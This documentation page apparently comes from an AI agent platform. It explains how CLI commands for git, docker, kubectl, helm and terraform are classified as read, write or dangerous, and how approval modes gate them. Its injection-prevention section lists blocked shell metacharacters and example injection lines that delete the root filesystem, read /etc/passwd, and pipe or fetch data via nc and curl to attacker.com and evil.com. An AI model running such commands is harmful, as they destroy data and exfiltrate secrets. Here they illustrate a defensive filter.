---
sidebar_position: 3
title: Command-Level Safety
description: Granular per-command safety classification for CLI tools
---

# Command-Level Safety

KubeAgentics implements **command-level safety classification** - a granular approach that classifies individual commands rather than entire tools. This provides precise control over what the AI can execute automatically versus what requires approval.

## Why Command-Level Classification?

Traditional tool-level permissions are too coarse:

```
❌ Tool-level: "Docker is a write tool"
   Problem: Blocks safe reads like `docker ps`

✅ Command-level: "docker ps = read, docker rm = dangerous"
   Solution: Each command assessed individually
```

### Benefits

| Aspect | Tool-Level | Command-Level |
|--------|-----------|---------------|
| **Granularity** | Binary (allow/deny) | Per-command control |
| **Read operations** | Often blocked | Freely allowed |
| **User experience** | Frustrating restrictions | Smooth exploration |
| **Security** | Over-restrictive or too permissive | Just right |

## Classification Levels

### Read (Green)

Safe, read-only operations that can execute automatically.

**Characteristics:**
- No state changes
- No side effects
- Can run in Ask mode
- Auto-executed without approval

**Examples:**
```bash
git status           # Show working tree status
docker ps            # List containers
kubectl get pods     # List pods
helm list            # List releases
terraform show       # Show state
```

### Write (Yellow)

Mutations that require the Plan & Approve workflow.

**Characteristics:**
- Modifies state or configuration
- Generally reversible
- Blocked in Ask mode
- Requires plan approval in Plan mode

**Examples:**
```bash
git push             # Push changes to remote
docker build         # Build image
kubectl apply        # Apply configuration
helm install         # Install chart
terraform apply      # Apply infrastructure changes
```

### Dangerous (Red)

Destructive operations requiring explicit confirmation.

**Characteristics:**
- Potentially irreversible
- Data loss risk
- Blocked in Ask mode
- Extra confirmation in Plan mode
- Highlighted risk warnings

**Examples:**
```bash
git push --force     # Force push (rewrites history)
docker rm            # Remove container
kubectl delete       # Delete resources
helm uninstall       # Remove release
terraform destroy    # Destroy infrastructure
```

## How Classification Works

### Pattern Matching

Commands are classified by matching against predefined patterns:

```
Command: kubectl get pods -A
         │
         ├── Tool: kubectl
         │
         ├── Subcommand: get
         │
         ├── Pattern match: "get" → Read
         │
         └── Classification: Read ✅
```

### Pattern Priority

More specific patterns take precedence:

```
Command: git push --force
         │
         ├── Pattern "push" → Write
         │
         ├── Pattern "push --force" → Dangerous (more specific)
         │
         └── Classification: Dangerous 🔴
```

### Default Classification

Commands without matching patterns default to **Write**:

```
Command: kubectl custom-plugin
         │
         ├── No pattern match
         │
         └── Default: Write (safe default)
```

## Complete Pattern Reference

### Git

| Pattern | Classification | Notes |
|---------|----------------|-------|
| `status` | Read | View working tree |
| `log` | Read | View history |
| `diff` | Read | View changes |
| `show` | Read | View objects |
| `branch` | Read | List branches |
| `remote` | Read | View remotes |
| `tag` | Read | List tags |
| `ls-files` | Read | List tracked files |
| `ls-remote` | Read | List remote refs |
| `rev-parse` | Read | Parse revisions |
| `add` | Write | Stage changes |
| `commit` | Write | Record changes |
| `push` | Write | Push to remote |
| `pull` | Write | Fetch and merge |
| `fetch` | Write | Fetch from remote |
| `merge` | Write | Join histories |
| `rebase` | Write | Reapply commits |
| `checkout` | Write | Switch branches |
| `switch` | Write | Switch branches |
| `reset` | Dangerous | Reset HEAD |
| `clean` | Dangerous | Remove untracked |
| `push --force` | Dangerous | Force push |

### Docker

| Pattern | Classification | Notes |
|---------|----------------|-------|
| `ps` | Read | List containers |
| `images` | Read | List images |
| `logs` | Read | View logs |
| `inspect` | Read | View details |
| `stats` | Read | Resource usage |
| `top` | Read | Process list |
| `port` | Read | Port mappings |
| `version` | Read | Version info |
| `info` | Read | System info |
| `build` | Write | Build image |
| `run` | Write | Create container |
| `pull` | Write | Pull image |
| `push` | Write | Push image |
| `tag` | Write | Tag image |
| `start` | Write | Start container |
| `stop` | Write | Stop container |
| `restart` | Write | Restart container |
| `rm` | Dangerous | Remove container |
| `rmi` | Dangerous | Remove image |
| `prune` | Dangerous | Remove unused |
| `system prune` | Dangerous | Remove all unused |

### Kubectl

| Pattern | Classification | Notes |
|---------|----------------|-------|
| `get` | Read | List resources |
| `describe` | Read | Show details |
| `logs` | Read | View pod logs |
| `top` | Read | Resource usage |
| `explain` | Read | API documentation |
| `api-resources` | Read | List API resources |
| `api-versions` | Read | List API versions |
| `cluster-info` | Read | Cluster info |
| `config view` | Read | View kubeconfig |
| `config get-contexts` | Read | List contexts |
| `config current-context` | Read | Current context |
| `version` | Read | Version info |
| `apply` | Write | Apply config |
| `create` | Write | Create resource |
| `patch` | Write | Update resource |
| `scale` | Write | Scale replicas |
| `rollout` | Write | Manage rollouts |
| `label` | Write | Update labels |
| `annotate` | Write | Update annotations |
| `set` | Write | Set properties |
| `expose` | Write | Expose service |
| `autoscale` | Write | Configure HPA |
| `delete` | Dangerous | Delete resource |
| `drain` | Dangerous | Drain node |
| `cordon` | Dangerous | Mark unschedulable |
| `uncordon` | Dangerous | Mark schedulable |
| `taint` | Dangerous | Add taint |
| `exec` | Dangerous | Execute in container |

### Helm

| Pattern | Classification | Notes |
|---------|----------------|-------|
| `list` | Read | List releases |
| `status` | Read | Release status |
| `get` | Read | Download info |
| `history` | Read | Release history |
| `show` | Read | Show chart info |
| `template` | Read | Render templates |
| `search` | Read | Search charts |
| `repo list` | Read | List repos |
| `version` | Read | Version info |
| `install` | Write | Install chart |
| `upgrade` | Write | Upgrade release |
| `rollback` | Write | Rollback release |
| `repo add` | Write | Add repo |
| `repo update` | Write | Update repos |
| `uninstall` | Dangerous | Remove release |
| `repo remove` | Dangerous | Remove repo |

### Terraform

| Pattern | Classification | Notes |
|---------|----------------|-------|
| `show` | Read | Show state |
| `state list` | Read | List resources |
| `state show` | Read | Show resource |
| `output` | Read | Show outputs |
| `validate` | Read | Validate config |
| `fmt` | Read | Format config |
| `version` | Read | Version info |
| `providers` | Read | Show providers |
| `init` | Write | Initialize |
| `plan` | Write | Create plan |
| `apply` | Write | Apply changes |
| `import` | Write | Import resource |
| `refresh` | Write | Refresh state |
| `destroy` | Dangerous | Destroy all |
| `state rm` | Dangerous | Remove from state |
| `taint` | Dangerous | Mark for replace |
| `untaint` | Dangerous | Remove taint |

## Integration with Guardrails

### Ask Mode

Only **Read** commands execute:

```
┌─────────────────────────────────────┐
│          ASK MODE FILTER            │
├─────────────────────────────────────┤
│ Read commands     → ✅ Execute      │
│ Write commands    → ❌ Blocked      │
│ Dangerous commands→ ❌ Blocked      │
└─────────────────────────────────────┘
```

### Plan Mode

All commands go through Plan & Approve:

```
┌─────────────────────────────────────┐
│         PLAN MODE WORKFLOW          │
├─────────────────────────────────────┤
│ Read commands     → ✅ In plan      │
│ Write commands    → ⚠️ Risk: Medium │
│ Dangerous commands→ 🔴 Risk: High   │
└─────────────────────────────────────┘
```

## Viewing Classifications

### In Settings UI

1. Go to **Settings > Local CLI**
2. Find an installed tool
3. Click **Commands** button
4. View all patterns with safety badges

### In AI Activity Log

Executed commands show their classification:

```
[12:34:56] Tool: kubectl
           Command: kubectl get pods -A
           Safety: Read ✅
           Duration: 234ms

[12:35:12] Tool: kubectl
           Command: kubectl scale deployment/web --replicas=3
           Safety: Write ⚠️
           Approved: Yes
           Duration: 1.2s
```

## Shell Injection Prevention

All command execution includes injection protection:

### Blocked Characters

| Character | Meaning | Risk |
|-----------|---------|------|
| `;` | Command separator | Chain arbitrary commands |
| `\|` | Pipe | Redirect output to attacker |
| `&` | Background/AND | Execute additional commands |
| `$` | Variable | Expand environment secrets |
| `` ` `` | Substitution | Execute subcommands |
| `>` `<` | Redirect | Overwrite/read files |

### Example Blocks

```bash
# Attempted injection → Blocked
kubectl get pods; rm -rf /
kubectl get $(cat /etc/passwd)
kubectl get pods | nc attacker.com 1234
docker run nginx && curl evil.com

# Error: Command contains shell metacharacters
```

## Best Practices

### For Users

1. **Trust read operations** - They're safe to run freely
2. **Review write plans** - Understand what will change
3. **Extra caution with dangerous** - Verify before confirming
4. **Use Ask mode first** - Gather info before acting

### For Security Teams

1. **Audit patterns** - Review classification coverage
2. **Monitor dangerous** - Alert on dangerous command execution
3. **Review activity logs** - Track AI command usage
4. **Test edge cases** - Verify injection protection

### For Administrators

1. **Don't weaken defaults** - Classifications are intentional
2. **Add custom patterns** - If needed for internal tools
3. **Document overrides** - Track any classification changes
4. **Regular reviews** - Audit patterns quarterly

## Related

- [Guardrails Overview](./overview.md) - All safety mechanisms
- [Tool Classification](./tool-classification.md) - Tool-level classification
- [Local CLI Tools](../features/local-cli-tools.md) - CLI tool discovery
- [Ask Mode](../features/ask-mode.md) - Read-only exploration
- [Plan & Approve Mode](../features/plan-mode.md) - Safe change execution
